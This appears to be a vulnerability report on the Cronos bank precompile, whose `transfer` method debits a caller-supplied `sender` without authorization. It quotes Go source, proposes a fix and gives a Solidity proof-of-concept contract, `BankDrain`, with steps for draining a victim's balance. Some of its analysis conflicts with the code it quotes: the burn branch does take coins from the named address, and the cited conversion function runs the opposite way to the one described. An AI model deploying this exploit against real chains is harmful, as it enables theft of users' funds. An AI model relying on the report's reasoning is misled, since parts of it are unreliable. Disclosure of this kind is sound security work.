### Title
Bank Precompile `transfer` Accepts Arbitrary `sender` Without Caller Validation — (`x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `transfer` case in the bank precompile's `Run` method accepts the `sender` address as a user-supplied calldata argument and passes it directly to `bankKeeper.SendCoins` without verifying that it matches the actual EVM caller (`contract.CallerAddress`). Any EVM contract can therefore invoke the bank precompile and name an arbitrary victim as the `sender`, transferring that victim's bank-module tokens to any destination without their authorization.

---

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `TransferMethodName` branch unpacks three arguments from calldata — `sender`, `recipient`, and `amount` — and immediately uses the caller-supplied `sender` as the debit account: [1](#0-0) 

```go
sender := args[0].(common.Address)   // ← taken from calldata, not from the actual EVM caller
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())  // denom is tied to the calling contract
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is no guard of the form `require sender == contract.CallerAddress`. The `denom` is correctly scoped to the calling contract via `EVMDenom(contract.Caller())`, but the account being debited is entirely attacker-controlled.

Compare this with the `mint`/`burn` branch in the same file, where the `recipient` argument is used only as the *destination* of a module-minted coin — the module itself is the authority. The `transfer` branch is the only place where an externally-supplied address is used as the *source* of a `SendCoins` call with no authorization check. [2](#0-1) 

---

### Impact Explanation

**Critical — Unauthorized transfer of CRC20/CRC21 bank-module tokens from any user's account.**

Attack path:

1. Attacker deploys (or reuses) a contract `C` whose address maps to a live bank denom `cronos0x{C}` (i.e., a registered CRC21/CRC20 source token with users who hold the native bank representation after calling `MsgConvertVouchers`).
2. Attacker calls `bankPrecompile.transfer(victim, attacker, amount)` from contract `C`.
3. `denom = EVMDenom(C)` = `cronos0x{C}`.
4. `bankKeeper.SendCoins(victim, attacker, amount × cronos0x{C})` executes with no approval from `victim`.
5. Victim's bank-module balance is drained to the attacker.

The `MsgConvertVouchers` flow explicitly moves EVM-side tokens into the bank module as native coins: [3](#0-2) 

Users who convert their CRC21 tokens to native bank coins are the direct victims. The attacker needs no special privilege — only the ability to deploy or call a contract whose denom has holders.

---

### Likelihood Explanation

- Any unprivileged EVM user can deploy a contract and call the bank precompile.
- The prerequisite (victims holding the calling contract's bank denom) is satisfied whenever users interact with `MsgConvertVouchers` for a CRC21 source token.
- No leaked keys, governance action, or cryptographic break is required.

---

### Recommendation

Add a caller-identity check before executing `SendCoins`. The `sender` argument must equal the actual EVM caller:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    // Enforce that only the calling contract can debit its own mapped denom
    if sender != contract.CallerAddress {
        return nil, errors.New("sender must be the calling contract address")
    }
    ...
```

Alternatively, remove the `sender` argument entirely and derive it from `contract.CallerAddress`, mirroring how `denom` is already derived from `contract.Caller()`.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract BankDrain {
    // Bank precompile address (fixed in Cronos)
    IBankPrecompile constant bank = IBankPrecompile(0x0000000000000000000000000000000000000804);

    // Called by attacker: drains `victim`'s cronos0x{address(this)} bank tokens
    function drain(address victim, address attacker, uint256 amount) external {
        // denom = EVMDenom(address(this)) = "cronos0x{BankDrain}"
        // No check that victim authorized this transfer
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Deploy `BankDrain` at address `0xDEAD`.
2. Ensure victim holds `cronos0xDEAD` bank tokens (e.g., after `MsgConvertVouchers`).
3. Call `BankDrain.drain(victim, attacker, victimBalance)`.
4. `bankKeeper.SendCoins(victim → attacker, cronos0xDEAD)` executes — victim's balance is zero, attacker received the funds. [4](#0-3)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L112-156)
```go
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/ibc.go (L21-77)
```go
func (k Keeper) ConvertVouchersToEvmCoins(ctx sdk.Context, from string, coins sdk.Coins) error {
	acc, err := sdk.AccAddressFromBech32(from)
	if err != nil {
		return err
	}

	params := k.GetParams(ctx)
	evmParams := k.GetEvmParams(ctx)
	for _, c := range coins {
		switch c.Denom {
		case params.IbcCroDenom:
			if params.IbcCroDenom == "" {
				return errorsmod.Wrap(types.ErrIbcCroDenomEmpty, "ibc is disabled")
			}

			// Send ibc tokens to escrow address
			err := k.bankKeeper.SendCoinsFromAccountToModule(ctx, acc, types.ModuleName, sdk.NewCoins(c))
			if err != nil {
				return err
			}
			// Compute new amount, because basecro is a 8 decimals token, we need to multiply by 10^10 to make it
			// a 18 decimals token
			amount18dec := sdk.NewCoin(evmParams.EvmDenom, c.Amount.Mul(sdkmath.NewIntFromBigInt(types.TenPowTen)))

			// Mint new evm tokens
			if err := k.bankKeeper.MintCoins(
				ctx, types.ModuleName, sdk.NewCoins(amount18dec),
			); err != nil {
				return err
			}

			// Send evm tokens to receiver
			if err := k.bankKeeper.SendCoinsFromModuleToAccount(
				ctx, types.ModuleName, acc, sdk.NewCoins(amount18dec),
			); err != nil {
				return err
			}

		default:
			err := k.ConvertCoinFromNativeToCRC21(ctx, common.BytesToAddress(acc.Bytes()), c, params.EnableAutoDeployment)
			if err != nil {
				return err
			}
		}
	}
	defer func() {
		for _, a := range coins {
			if a.Amount.IsInt64() {
				telemetry.SetGaugeWithLabels(
					[]string{"tx", "msg", "ConvertVouchersToEvmCoins"},
					float32(a.Amount.Int64()),
					[]metrics.Label{telemetry.NewLabel("denom", a.Denom)},
				)
			}
		}
	}()
	return nil
```
